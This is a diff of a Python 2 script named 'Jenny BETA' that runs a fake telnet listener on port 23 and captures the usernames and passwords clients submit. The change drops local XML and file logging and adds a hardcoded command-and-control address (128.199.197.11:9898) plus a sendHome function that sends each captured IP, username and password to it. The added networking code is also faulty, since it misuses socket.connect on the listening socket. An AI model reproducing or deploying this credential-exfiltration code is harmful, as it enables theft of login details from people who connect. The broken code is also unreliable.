@@ -12,14 +12,8 @@ s.bind(('',23))
 s.listen(10)
 s.settimeout(10)
 
-#Creates XML structure
-root = minidom.Document()
-xml = root.createElement("root")
-root.appendChild(xml)
-
-#Creates attempt parent
-attemptParent = root.createElement("Attempt")
-xml.appendChild(attemptParent)
+C2 = "128.199.197.11"
+C2PORT = 9898
 
 print "[+]-------Jenny BETA-------[+]"
 
@@ -58,14 +52,25 @@ def formatStrings(ip, usr, pw):
         pass
     elif not pw:
         pw = "No password provided."
-        consoleLogger(ip, str(usr[0]), pw)
-        xmlLogger(ip, str(usr[0]), pw)
-        fileLogger(str(usr[0]), pw)
+        sendHome(ip, str(usr[0]), pw)
     else:
-        consoleLogger(ip, str(usr[0]), str(pw[0]))
-        xmlLogger(ip, str(usr[0]), str(pw[0]))
-        fileLogger(str(usr[0]), str(pw[0]))
+        sendHome(ip, str(usr[0]), str(pw[0]))
 
+def sendHome(ip, usr, pw):
+    try:
+        s.connect(C2, C2PORT)
+        s.send("Onyx1: " + " " + ip + " " + usr + " " + pw)
+    except socket.error, ex:
+        print ex
+    
+
+    
+
+if __name__ == "__main__":
+    recvConnection()
+
+
+'''
 #Logs information to console
 def consoleLogger(ip, usr, pw):
     ip = ip
@@ -74,31 +79,8 @@ def consoleLogger(ip, usr, pw):
     
     print(time.strftime("%d/%m/%Y") + " [" + time.strftime("%H:%M:%S") + "]" + " - " + ip + " using " + usr + "|" + pw)
 
-def xmlLogger(ip, usr, pw):
-    ip = ip
-    usr = str(usr)
-    pw = str(pw)
-
-    #Details for attemps created here
-    source = root.createElement("Source")
-    attemptParent.appendChild(source)
-    username = root.createElement("Username")
-    attemptParent.appendChild(username)
-    password = root.createElement("Password")
-    attemptParent.appendChild(password)
-    xml_str = root.toprettyxml(indent="\t")
-    attemptParent.setAttribute('Timestamp', time.strftime("%d/%m/%Y") + " [" + time.strftime("%H:%M:%S") + "]")
-    source.appendChild(root.createTextNode(ip))
-    username.appendChild(root.createTextNode(usr))
-    password.appendChild(root.createTextNode(pw))
-    
-    with open("logs.xml", "w") as xml:
-        xml.write(xml_str)
-
 def fileLogger(usr, pw):
     with open("credentials.txt", "a") as f:
         f.write(usr + " " + pw + "\n")
-    
 
-if __name__ == "__main__":
-    recvConnection()
+'''
